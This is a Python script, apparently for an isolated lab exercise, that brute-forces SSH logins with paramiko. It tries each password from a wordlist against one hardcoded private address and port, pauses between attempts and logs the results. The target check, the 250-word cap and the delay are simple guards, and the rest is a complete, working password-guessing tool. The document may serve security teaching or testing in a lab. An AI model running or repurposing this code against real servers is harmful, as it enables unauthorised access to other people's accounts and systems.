#!/usr/bin/env python3
"""LAB-2 C2 — dò SSH chậm (NGHIÊN CỨU, lab cô lập).
Đích CỐ ĐỊNH chỉ 192.168.77.20; wordlist nhỏ; cách quãng; không quét mạng.
"""
from __future__ import annotations

import argparse
import os
import socket
import sys
import time

import paramiko

ALLOWED_HOST = "192.168.77.20"
ALLOWED_PORT = 22022  # SSH lab cô lập trên 202


def main() -> int:
    ap = argparse.ArgumentParser(description="LAB-2 C2 sshbrute (chi 192.168.77.20)")
    ap.add_argument("--dich", required=True, help="phai la 192.168.77.20")
    ap.add_argument("--port", type=int, default=ALLOWED_PORT)
    ap.add_argument("--user", required=True)
    ap.add_argument("--wordlist", required=True)
    ap.add_argument("--cach-quang", type=float, default=5.0, help="giay giua moi lan thu")
    ap.add_argument("--log", required=True)
    ap.add_argument("--timeout", type=float, default=8.0)
    args = ap.parse_args()

    if args.dich != ALLOWED_HOST:
        raise SystemExit(f"dich chi duoc {ALLOWED_HOST}, nhan {args.dich!r}")
    if args.port != ALLOWED_PORT:
        raise SystemExit(f"port chi duoc {ALLOWED_PORT} (SSH lab), nhan {args.port}")

    words = []
    with open(args.wordlist, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            w = line.strip()
            if w and not w.startswith("#"):
                words.append(w)
    if len(words) > 250:
        raise SystemExit(f"wordlist qua lon ({len(words)}); toi da 250 (lab)")
    if not words:
        raise SystemExit("wordlist rong")

    os.makedirs(os.path.dirname(args.log) or ".", exist_ok=True)
    found = ""
    n_ok = 0
    with open(args.log, "w") as lg:
        lg.write("n\tmono_ns\twall\tuser\tok\tdetail\n")
        for i, pw in enumerate(words, 1):
            t0 = time.monotonic_ns()
            tw = time.strftime("%Y-%m-%dT%H:%M:%S%z")
            ok = 0
            detail = ""
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    hostname=ALLOWED_HOST,
                    port=args.port,
                    username=args.user,
                    password=pw,
                    timeout=args.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                    banner_timeout=args.timeout,
                    auth_timeout=args.timeout,
                )
                ok = 1
                n_ok = 1
                found = f"n={i}"
                detail = "auth_ok"
                client.close()
            except paramiko.AuthenticationException:
                detail = "auth_fail"
            except (socket.error, paramiko.SSHException, OSError) as e:
                detail = f"err:{type(e).__name__}"
            finally:
                try:
                    client.close()
                except Exception:
                    pass
            lg.write(f"{i}\t{t0}\t{tw}\t{args.user}\t{ok}\t{detail}\n")
            lg.flush()
            print(f"try={i}/{len(words)} ok={ok} detail={detail}", flush=True)
            if ok:
                break
            if i < len(words):
                time.sleep(args.cach_quang)

        lg.write(f"# summary tries={i} success={n_ok} {found}\n")
    print(f"lab2_sshbrute tries={i} success={n_ok} {found}", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
